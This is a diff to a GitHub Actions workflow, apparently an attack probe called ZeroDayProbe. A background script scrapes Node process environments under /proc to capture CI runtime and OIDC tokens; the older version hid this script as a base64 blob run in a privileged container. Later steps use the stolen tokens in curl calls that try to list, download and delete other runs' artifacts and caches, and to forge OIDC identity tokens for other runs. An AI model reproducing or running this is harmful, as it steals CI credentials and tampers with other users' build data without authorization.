@@ -1,4 +1,4 @@
-name: ZeroDayProbe8
+name: ZeroDayProbe9
 on:
   push:
     branches: [main]
@@ -9,27 +9,58 @@ jobs:
   probe:
     runs-on: ubuntu-latest
     steps:
-      - name: Start minimal grab (Docker proc-race writes to host tmp)
+      - name: Start proc-race directly on host (no Docker needed)
         run: |
-          printf '%s' 'IyEvYmluL2Jhc2gKZWNobyAiPUdSQUJfU1RBUlQ9IgplY2hvICJ0cz0kKGRhdGUgLXUgKyVZLSVtLSVkVCVIOiVNOiVTWikiCmZvciBpIGluICQoc2VxIDEgMjAwKTsgZG8KICBmb3IgcGlkIGluICQobHMgL3Byb2MvIDI+L2Rldi9udWxsIHwgZ3JlcCAtRSAiXlswLTldKyQiKTsgZG8KICAgIGNtZD0kKGNhdCAvcHJvYy8kcGlkL2NtZGxpbmUgMj4vZGV2L251bGwgfCB0ciAiXDAiICIgIiB8IGhlYWQgLWMgMjAwKQogICAgaWYgZWNobyAiJGNtZCIgfCBncmVwIC1xaUUgIl5ub2RlIHxub2RlIC8iOyB0aGVuCiAgICAgIGVudmRhdGE9JChjYXQgL3Byb2MvJHBpZC9lbnZpcm9uIDI+L2Rldi9udWxsIHwgYmFzZTY0IC13MCB8fCB0cnVlKQogICAgICBpZiBbIC1uICIkZW52ZGF0YSIgXSAmJiBlY2hvICIkZW52ZGF0YSIgfCBiYXNlNjQgLWQgMj4vZGV2L251bGwgfCBncmVwIC1xIEFDVElPTlNfUlVOVElNRV9UT0tFTjsgdGhlbgogICAgICAgIGVjaG8gIkdPVF9QSUQ9JHBpZCBJVEVSPSRpIgogICAgICAgIFJUPSQoZWNobyAiJGVudmRhdGEiIHwgYmFzZTY0IC1kIHwgdHIgIlwwIiAiXG4iIHwgZ3JlcCAiXkFDVElPTlNfUlVOVElNRV9UT0tFTj0iIHwgY3V0IC1kPSAtZjItKQogICAgICAgIE9JRENfUkVRPSQoZWNobyAiJGVudmRhdGEiIHwgYmFzZTY0IC1kIHwgdHIgIlwwIiAiXG4iIHwgZ3JlcCAiXkFDVElPTlNfSURfVE9LRU5fUkVRVUVTVF9UT0tFTj0iIHwgY3V0IC1kPSAtZjItKQogICAgICAgIE9JRENfVVJMPSQoZWNobyAiJGVudmRhdGEiIHwgYmFzZTY0IC1kIHwgdHIgIlwwIiAiXG4iIHwgZ3JlcCAiXkFDVElPTlNfSURfVE9LRU5fUkVRVUVTVF9VUkw9IiB8IGN1dCAtZD0gLWYyLSkKICAgICAgICBSRVNVTFRTX1VSTD0kKGVjaG8gIiRlbnZkYXRhIiB8IGJhc2U2NCAtZCB8IHRyICJcMCIgIlxuIiB8IGdyZXAgIl5BQ1RJT05TX1JFU1VMVFNfVVJMPSIgfCBjdXQgLWQ9IC1mMi0pCiAgICAgICAgUlVOVElNRV9VUkw9JChlY2hvICIkZW52ZGF0YSIgfCBiYXNlNjQgLWQgfCB0ciAiXDAiICJcbiIgfCBncmVwICJeQUNUSU9OU19SVU5USU1FX1VSTD0iIHwgY3V0IC1kPSAtZjItKQogICAgICAgIE9SQ0hfSUQ9JChlY2hvICIkZW52ZGF0YSIgfCBiYXNlNjQgLWQgfCB0ciAiXDAiICJcbiIgfCBncmVwICJeQUNUSU9OU19PUkNIRVNUUkFUSU9OX0lEPSIgfCBjdXQgLWQ9IC1mMi0pCiAgICAgICAgcHJpbnRmICclcycgIiRSVCIgPiAvdG1wX2hvc3QvWkRfUlQudHh0CiAgICAgICAgcHJpbnRmICclcycgIiRPSURDX1JFUSIgPiAvdG1wX2hvc3QvWkRfT0lEQ19SRVEudHh0CiAgICAgICAgcHJpbnRmICclcycgIiRPSURDX1VSTCIgPiAvdG1wX2hvc3QvWkRfT0lEQ19VUkwudHh0CiAgICAgICAgcHJpbnRmICclcycgIiRSRVNVTFRTX1VSTCIgPiAvdG1wX2hvc3QvWkRfUkVTVUxUU19VUkwudHh0CiAgICAgICAgcHJpbnRmICclcycgIiRSVU5USU1FX1VSTCIgPiAvdG1wX2hvc3QvWkRfUlVOVElNRV9VUkwudHh0CiAgICAgICAgcHJpbnRmICclcycgIiRPUkNIX0lEIiA+IC90bXBfaG9zdC9aRF9PUkNIX0lELnR4dAogICAgICAgIGVjaG8gIkRPTkUiID4gL3RtcF9ob3N0L1pEX1NUQVRVUy50eHQKICAgICAgICBlY2hvICJSVF9MRU49JHsjUlR9IgogICAgICAgIGVjaG8gIk9JRENfVVJMPSRPSURDX1VSTCIKICAgICAgICBlY2hvICJSRVNVTFRTX1VSTD0kUkVTVUxUU19VUkwiCiAgICAgICAgZWNobyAiUlVOVElNRV9VUkw9JFJVTlRJTUVfVVJMIgogICAgICAgIGJyZWFrIDIKICAgICAgZmkKICAgIGZpCiAgZG9uZQogIHNsZWVwIDAuMQpkb25lCmVjaG8gIj1HUkFCX0RPTkU9Igo=' | base64 -d > /tmp/grab.sh
+          cat > /tmp/grab.sh << 'GRABEOF'
+          #!/bin/bash
+          echo "=GRAB_START="
+          echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          for i in $(seq 1 300); do
+            for pid in $(ls /proc/ 2>/dev/null | grep -E "^[0-9]+$"); do
+              cmd=$(cat /proc/$pid/cmdline 2>/dev/null | tr "\0" " " | head -c 200)
+              if echo "$cmd" | grep -qiE "^node |node /"; then
+                envdata=$(cat /proc/$pid/environ 2>/dev/null | base64 -w0 || true)
+                if [ -n "$envdata" ] && echo "$envdata" | base64 -d 2>/dev/null | grep -q ACTIONS_RUNTIME_TOKEN; then
+                  echo "GOT_PID=$pid ITER=$i"
+                  RT=$(echo "$envdata" | base64 -d | tr "\0" "\n" | grep "^ACTIONS_RUNTIME_TOKEN=" | cut -d= -f2-)
+                  OIDC_REQ=$(echo "$envdata" | base64 -d | tr "\0" "\n" | grep "^ACTIONS_ID_TOKEN_REQUEST_TOKEN=" | cut -d= -f2-)
+                  OIDC_URL=$(echo "$envdata" | base64 -d | tr "\0" "\n" | grep "^ACTIONS_ID_TOKEN_REQUEST_URL=" | cut -d= -f2-)
+                  RESULTS_URL=$(echo "$envdata" | base64 -d | tr "\0" "\n" | grep "^ACTIONS_RESULTS_URL=" | cut -d= -f2-)
+                  RUNTIME_URL=$(echo "$envdata" | base64 -d | tr "\0" "\n" | grep "^ACTIONS_RUNTIME_URL=" | cut -d= -f2-)
+                  printf '%s' "$RT" > /tmp/ZD_RT.txt
+                  printf '%s' "$OIDC_REQ" > /tmp/ZD_OIDC_REQ.txt
+                  printf '%s' "$OIDC_URL" > /tmp/ZD_OIDC_URL.txt
+                  printf '%s' "$RESULTS_URL" > /tmp/ZD_RESULTS_URL.txt
+                  printf '%s' "$RUNTIME_URL" > /tmp/ZD_RUNTIME_URL.txt
+                  echo "DONE" > /tmp/ZD_STATUS.txt
+                  echo "RT_LEN=${#RT}"
+                  echo "OIDC_URL=$OIDC_URL"
+                  echo "RESULTS_URL=$RESULTS_URL"
+                  break 2
+                fi
+              fi
+            done
+            sleep 0.1
+          done
+          echo "=GRAB_DONE="
+          GRABEOF
           chmod +x /tmp/grab.sh
-          echo "probe8" > /tmp/probe.txt
+          echo "probe9" > /tmp/probe.txt
           rm -f /tmp/ZD_STATUS.txt /tmp/ZD_RT.txt
-          nohup docker run --rm --privileged --pid=host \
-            -v /tmp/grab.sh:/grab.sh:ro \
-            -v /tmp:/tmp_host:rw \
-            ubuntu:24.04 bash /grab.sh > /tmp/grab.log 2>&1 &
+          nohup bash /tmp/grab.sh > /tmp/grab.log 2>&1 &
           echo $! > /tmp/bgpid.txt
-          sleep 3
-      - name: Spawn token (upload-artifact = Node.js with ACTIONS_RUNTIME_TOKEN)
+          sleep 1
+
+      - name: Spawn token (upload-artifact triggers Node.js with ACTIONS_RUNTIME_TOKEN)
         uses: actions/upload-artifact@v4
         with:
           name: probe-art
           path: /tmp/probe.txt
-      - name: Wait grab then run ALL vectors from HOST (host has curl)
+
+      - name: Wait for token then run ALL vectors (host curl)
         run: |
           echo "=GRAB_LOG="
-          for i in $(seq 1 60); do
+          for i in $(seq 1 30); do
             if [ -f /tmp/ZD_STATUS.txt ] && grep -q DONE /tmp/ZD_STATUS.txt; then
               echo "TOKEN_GRABBED at iter=$i"
               break
@@ -50,28 +81,33 @@ jobs:
           echo "RESULTS_URL=$RESULTS_URL"
           echo "OIDC_URL=$OIDC_URL"
 
+          if [ -z "$RT" ]; then
+            echo "NO_TOKEN_CAPTURED - exiting"
+            exit 1
+          fi
+
           P32="62b2fd0f-6d09-4648-9063-f2281ca31c50"
           J32="ab2ec91c-0a74-5a3f-a68c-b0d93647321a"
           P36="b7053f37-c231-4cee-8fe9-33514d44b40b"
           J36="efc9c5e3-54ec-55a7-a0fa-716737c5aba4"
 
           echo "=V1_GENERICREAD_BOLA="
-          echo "V1a ListArtifacts Run32 (cross-run BOLA):"
+          echo "V1a ListArtifacts Run32 (cross-run BOLA test):"
           curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
             -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
             -d "{\"workflowRunBackendId\":\"$P32\",\"workflowJobRunBackendId\":\"$J32\"}"
           echo ""
-          echo "V1b ListArtifacts Run36 (cross-run BOLA):"
+          echo "V1b ListArtifacts Run36 (cross-run BOLA test):"
           curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
             -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
             -d "{\"workflowRunBackendId\":\"$P36\",\"workflowJobRunBackendId\":\"$J36\"}"
           echo ""
-          echo "V1c GetSignedArtifactURL Run32:"
+          echo "V1c GetSignedArtifactURL Run32 (cross-run download):"
           curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL" \
             -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
             -d "{\"workflowRunBackendId\":\"$P32\",\"workflowJobRunBackendId\":\"$J32\",\"name\":\"probe-art\"}"
           echo ""
-          echo "V1d DeleteArtifact Run36 (no-scp-check):"
+          echo "V1d DeleteArtifact Run36 (cross-run, no scp check):"
           curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/DeleteArtifact" \
             -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
             -d "{\"workflowRunBackendId\":\"$P36\",\"workflowJobRunBackendId\":\"$J36\",\"name\":\"probe-art\"}"
@@ -80,7 +116,7 @@ jobs:
 
           echo "=V2_OIDC="
           if [ -n "$OIDC_URL" ] && [ -n "$OIDC_REQ" ]; then
-            echo "V2a GH audience (normal):"
+            echo "V2a GH audience (normal OIDC):"
             curl -s -w "\nHTTP=%{http_code}" -H "Authorization: Bearer $OIDC_REQ" "${OIDC_URL}&audience=api.github.com"
             echo ""
             echo "V2b AWS audience:"
@@ -89,6 +125,7 @@ jobs:
 
             OWN_PLAN=$(echo "$OIDC_URL" | grep -oE 'idtoken/[^/]+' | cut -d/ -f2)
             OWN_JOB=$(echo "$OIDC_URL" | grep -oE 'idtoken/[^/]+/[^?]+' | cut -d/ -f3)
+            echo "OWN_PLAN=$OWN_PLAN OWN_JOB=$OWN_JOB"
             BASE32="${OIDC_URL/$OWN_PLAN\//$P32\/}"
             SUBST32="${BASE32/$OWN_JOB/$J32}"
             BASE36="${OIDC_URL/$OWN_PLAN\//$P36\/}"
@@ -96,15 +133,15 @@ jobs:
             NIL_URL="${OIDC_URL/$OWN_PLAN/00000000-0000-0000-0000-000000000000}"
             NIL_URL="${NIL_URL/$OWN_JOB/00000000-0000-0000-0000-000000000000}"
 
-            echo "V2d OIDC subst Run32 (forge OIDC for another run):"
+            echo "V2d OIDC URL substitution Run32 (forge OIDC identity of other run):"
             echo "SUBST32=$SUBST32"
             curl -s -w "\nHTTP=%{http_code}" -H "Authorization: Bearer $OIDC_REQ" "${SUBST32}&audience=api.github.com"
             echo ""
-            echo "V2e OIDC subst Run36:"
+            echo "V2e OIDC URL substitution Run36:"
             echo "SUBST36=$SUBST36"
             curl -s -w "\nHTTP=%{http_code}" -H "Authorization: Bearer $OIDC_REQ" "${SUBST36}&audience=api.github.com"
             echo ""
-            echo "V2f OIDC NIL IDs (wildcard 000...000):"
+            echo "V2f OIDC NIL IDs (000...000 wildcard attempt):"
             echo "NIL_URL=$NIL_URL"
             curl -s -w "\nHTTP=%{http_code}" -H "Authorization: Bearer $OIDC_REQ" "${NIL_URL}&audience=api.github.com"
             echo ""
@@ -115,13 +152,13 @@ jobs:
           for ep in "_apis/pipelines/jobs" "_apis/build/builds" "_apis/distributedtask/hubs/build/plans" "_apis/pipelines"; do
             echo "V3 $ep:"
             curl -s -w "\nHTTP=%{http_code}" "${RUNTIME_URL}${ep}?api-version=2.0" \
-              -H "Authorization: Bearer $RT" | head -c 600
+              -H "Authorization: Bearer $RT" | head -c 500
             echo ""
           done
           echo "=V3_END="
 
           echo "=V4_CACHE="
-          echo "V4b CacheService BOLA Run32:"
+          echo "V4 CacheService BOLA Run32:"
           curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL" \
             -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
             -d "{\"workflowRunBackendId\":\"$P32\",\"workflowJobRunBackendId\":\"$J32\",\"key\":\"node-modules\",\"restoreKeys\":[\"node\"],\"version\":\"1\"}"
